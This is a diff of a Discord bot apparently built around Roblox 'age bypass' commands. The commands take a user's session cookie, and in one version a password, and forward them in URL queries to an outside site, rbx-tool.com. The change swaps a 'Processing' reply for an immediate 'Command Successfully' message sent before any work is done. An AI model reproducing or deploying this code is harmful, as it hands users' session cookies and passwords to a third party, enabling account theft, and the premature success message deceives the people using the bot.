@@ -56,7 +56,7 @@ client.on('interactionCreate', async interaction => {
   if (interaction.commandName === 'bypass2008') {
     const cookie = interaction.options.getString('cookie');
 
-    await interaction.reply({ content: '⏳ Processing your request...', ephemeral: true });
+    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });
 
     try {
       const res = await fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`, {
@@ -86,7 +86,7 @@ client.on('interactionCreate', async interaction => {
     const cookie = interaction.options.getString('cookie');
     const password = interaction.options.getString('password');
 
-    await interaction.reply({ content: '⏳ Processing your request...', ephemeral: true });
+    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });
 
     try {
       const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`, {
